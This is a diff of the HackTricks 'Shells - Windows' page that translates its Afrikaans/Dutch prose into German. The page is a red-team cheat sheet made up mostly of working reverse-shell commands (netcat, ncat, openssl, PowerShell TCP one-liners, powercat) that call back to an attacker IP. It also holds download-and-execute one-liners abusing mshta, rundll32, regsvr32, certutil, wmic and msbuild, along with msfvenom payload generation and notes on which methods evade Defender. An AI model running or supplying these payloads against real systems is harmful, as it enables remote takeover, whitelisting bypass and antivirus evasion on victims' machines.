@@ -1,37 +1,37 @@
 # Shells - Windows
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
 
 ## Lolbas
 
-Die bladsy [lolbas-project.github.io](https://lolbas-project.github.io/) is vir Windows soos [https://gtfobins.github.io/](https://gtfobins.github.io/) vir linux is.\
-Dit is duidelik, **daar is geen SUID lêers of sudo regte in Windows nie**, maar dit is nuttig om te weet **hoe** sommige **binaries** (mis)bruik kan word om 'n soort onverwagte aksies uit te voer soos **arbitraire kode uit te voer.**
+Die Seite [lolbas-project.github.io](https://lolbas-project.github.io/) ist für Windows wie [https://gtfobins.github.io/](https://gtfobins.github.io/) für Linux.\
+Offensichtlich **gibt es keine SUID-Dateien oder sudo-Rechte in Windows**, aber es ist nützlich zu wissen, **wie** einige **Binaries** (miss)braucht werden können, um eine Art unerwarteter Aktionen wie **die Ausführung beliebigen Codes** durchzuführen.
 
 ## NC
 ```bash
 nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## NCAT
-slagoffer
+Opfer
 ```
 ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
 #Encryption to bypass firewall
 ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
 ```
-aanvaller
+Angreifer
 ```
 ncat -l <PORT>
 #Encryption to bypass firewall
@@ -39,7 +39,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) is 'n draagbare en veilige Netcat alternatief**. Dit werk op Unix-agtige stelsels en Win32. Met funksies soos sterk versleuteling, program uitvoering, aanpasbare bronpoorte, en deurlopende herverbinding, bied sbd 'n veelsydige oplossing vir TCP/IP kommunikasie. Vir Windows gebruikers kan die sbd.exe weergawe van die Kali Linux verspreiding as 'n betroubare vervanging vir Netcat gebruik word.
+**[sbd](https://www.kali.org/tools/sbd/) ist eine tragbare und sichere Netcat-Alternative**. Es funktioniert auf Unix-ähnlichen Systemen und Win32. Mit Funktionen wie starker Verschlüsselung, Programmausführung, anpassbaren Quellports und kontinuierlicher Wiederverbindung bietet sbd eine vielseitige Lösung für die TCP/IP-Kommunikation. Für Windows-Benutzer kann die sbd.exe-Version aus der Kali Linux-Distribution als zuverlässiger Ersatz für Netcat verwendet werden.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -72,13 +72,13 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## OpenSSH
 
-Aanvaller (Kali)
+Angreifer (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Slachtoffer
+Opfer
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -93,23 +93,23 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Proses wat netwerkoproep uitvoer: **powershell.exe**\
-Payload op skyf geskryf: **NEE** (_ten minste nêrens waar ek met procmon kon vind!_)
+Prozess, der einen Netzwerkaufruf durchführt: **powershell.exe**\
+Payload auf der Festplatte geschrieben: **NEIN** (_zumindest nirgendwo, wo ich mit procmon finden konnte!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Proses wat netwerkoproep uitvoer: **svchost.exe**\
-Payload op skyf geskryf: **WebDAV-kliënt plaaslike kas**
+Prozess, der einen Netzwerkaufruf ausführt: **svchost.exe**\
+Payload auf der Festplatte geschrieben: **WebDAV-Client-Cache**
 
-**Een liner:**
+**Einzeiler:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Kry meer inligting oor verskillende Powershell Shells aan die einde van hierdie dokument**
+**Erhalten Sie weitere Informationen zu verschiedenen Powershell-Shells am Ende dieses Dokuments**
 
 ## Mshta
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -121,15 +121,15 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Voorbeeld van hta-psh omgekeerde skulp (gebruik hta om PS agterdeur af te laai en uit te voer)**
+#### **Beispiel für eine hta-psh Reverse Shell (verwenden Sie hta, um ein PS-Backdoor herunterzuladen und auszuführen)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Jy kan baie maklik 'n Koadic zombie aflaai en uitvoer met die stager hta**
+**Sie können sehr einfach einen Koadic-Zombie mit dem Stager HTA herunterladen und ausführen.**
 
-#### hta voorbeeld
+#### hta Beispiel
 
-[**Van hier**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+[**Von hier**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
 <html>
 <head>
@@ -146,7 +146,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**Van hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Von hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -173,16 +173,16 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Gedeelte deur verdediger**
+**Von Defender erkannt**
 
 
 
 
 ## **Rundll32**
 
-[**Dll hallo wêreld voorbeeld**](https://github.com/carterjones/hello-world-dll)
+[**Dll Hallo Welt Beispiel**](https://github.com/carterjones/hello-world-dll)
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -190,11 +190,11 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Gevind deur verdediger**
+**Von Defender erkannt**
 
 **Rundll32 - sct**
 
-[**Van hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Von hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -226,7 +226,7 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -234,11 +234,11 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Gedig deur verdediger**
+**Von Defender erkannt**
 
 #### Regsvr32 -sct
 
-[**Van hier**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+[**Von hier**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 ```markup
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -264,21 +264,21 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Jy kan baie maklik 'n Koadic zombie aflaai en uitvoer met die stager regsvr**
+**Sie können sehr einfach einen Koadic-Zombie mit dem Stager regsvr herunterladen und ausführen.**
 
 ## Certutil
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
-Laai 'n B64dll af, dekodeer dit en voer dit uit.
+Laden Sie eine B64dll herunter, dekodieren Sie sie und führen Sie sie aus.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Laai 'n B64exe af, dekodeer dit en voer dit uit.
+Laden Sie eine B64exe herunter, dekodieren Sie sie und führen Sie sie aus.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Gevind deur verdediger**
+**Von Defender erkannt**
 
 
 ## **Cscript/Wscript**
@@ -289,14 +289,14 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Gevind deur verdediger**
+**Von Defender erkannt**
 
 ## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Proses wat netwerkoproep uitvoer: **svchost.exe**\
-Payload op skyf geskryf: **WebDAV-kliënt plaaslike kas**
+Prozess, der einen Netzwerkaufruf ausführt: **svchost.exe**\
+Payload auf der Festplatte geschrieben: **WebDAV-Client-Cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -305,28 +305,28 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Gevind deur verdediger**
+**Von Defender erkannt**
 
 ## **MSIExec**
 
-Aanvaller
+Angreifer
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Slachtoffer:
+Opfer:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**Gevind**
+**Erkannt**
 
 ## **Wmic**
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Voorbeeld xsl-lêer [van hier](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Beispiel xsl-Datei [von hier](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -338,84 +338,84 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**Nie gedetecteer nie**
+**Nicht erkannt**
 
-**Jy kan baie maklik 'n Koadic zombie aflaai en uitvoer met die stager wmic**
+**Sie können sehr einfach einen Koadic-Zombie mit dem Stager wmic herunterladen und ausführen**
 
 ## Msbuild
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-U kan hierdie tegniek gebruik om toepassingswitlys en Powershell.exe-beperkings te omseil. U sal met 'n PS-skal gevra word.\
-Laai net dit af en voer dit uit: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Sie können diese Technik verwenden, um die Anwendungs-Whitelist und die Einschränkungen von Powershell.exe zu umgehen. Da Sie mit einer PS-Shell aufgefordert werden.\
+Laden Sie dies einfach herunter und führen Sie es aus: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
-**Nie gedetecteer nie**
+**Nicht erkannt**
 
 ## **CSC**
 
-Compileer C# kode in die slagoffer masjien.
+Kompiliere C#-Code auf der Opfermaschine.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-You can download a basic C# reverse shell from here: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Sie können eine grundlegende C# Reverse Shell von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Nie gedetecteer nie**
+**Nicht erkannt**
 
 ## **Regasm/Regsvc**
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-**Ek het dit nie probeer nie**
+**Ich habe es nicht ausprobiert**
 
 [**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
 
 ## Odbcconf
 
-* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-**Ek het dit nie probeer nie**
+**Ich habe es nicht ausprobiert**
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Powershell Skale
+## Powershell Shells
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-In die **Skale** gids, is daar 'n klomp verskillende skale. Om Invoke-_PowerShellTcp.ps1_ te aflaai en uit te voer, maak 'n kopie van die skrif en voeg by die einde van die lêer:
+Im **Shells**-Ordner gibt es viele verschiedene Shells. Um Invoke-_PowerShellTcp.ps1_ herunterzuladen und auszuführen, machen Sie eine Kopie des Skripts und fügen Sie am Ende der Datei hinzu:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Begin om die skrip op 'n webbediener te bedien en voer dit aan die slagoffer se kant uit:
+Starten Sie das Skript auf einem Webserver und führen Sie es am Ende des Opfers aus:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender detecteer dit nie as kwaadwillige kode nie (nog, 3/04/2019).
+Defender erkennt es (noch) nicht als bösartigen Code (3.04.2019).
 
-**TODO: Kontroleer ander nishang shells**
+**TODO: Überprüfen Sie andere nishang-Shells**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Laai af, begin 'n webbediener, begin die luisteraar, en voer dit op die slagoffer se kant uit:
+Laden Sie es herunter, starten Sie einen Webserver, starten Sie den Listener und führen Sie es auf der Seite des Opfers aus:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender detecteer dit nie as kwaadwillige kode nie (nog, 3/04/2019).
+Defender erkennt es (noch) nicht als bösartigen Code (03.04.2019).
 
-**Ander opsies wat deur powercat aangebied word:**
+**Weitere Optionen, die von powercat angeboten werden:**
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port-Umleitung, hochladen/herunterladen, Payloads generieren, Dateien bereitstellen...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -436,37 +436,37 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Skep 'n powershell-lanser, stoor dit in 'n lêer en laai dit af en voer dit uit.
+Erstellen Sie einen PowerShell-Launcher, speichern Sie ihn in einer Datei und laden Sie ihn herunter und führen Sie ihn aus.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Gevind as kwaadwillige kode**
+**Als bösartiger Code erkannt**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Skep 'n powershell weergawe van metasploit agterdeur met behulp van unicorn
+Erstellen Sie eine PowerShell-Version des Metasploit-Hintertürs mit Unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Begin msfconsole met die geskepte hulpbron:
+Starte msfconsole mit der erstellten Ressource:
 ```
 msfconsole -r unicorn.rc
 ```
-Begin 'n webbediener wat die _powershell\_attack.txt_ lêer bedien en voer uit in die slagoffer:
+Starte einen Webserver, der die _powershell\_attack.txt_ Datei bereitstellt und führe sie beim Opfer aus:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Gedig as kwaadwillige kode**
+**Als bösartiger Code erkannt**
 
-## Meer
+## Mehr
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-konsol met 'n paar offensiewe PS-modules vooraf gelaai (gecyfer)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-Konsole mit einigen vorinstallierten offensiven PS-Modulen (verschlüsselt)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsol met 'n paar offensiewe PS-modules en proxy-detektering (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensiven PS-Modulen und Proxy-Erkennung (IEX)
 
-## Verwysings
+## Referenzen
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
@@ -478,16 +478,16 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsol met 'n paar offensie
 
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>HackTricks unterstützen</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
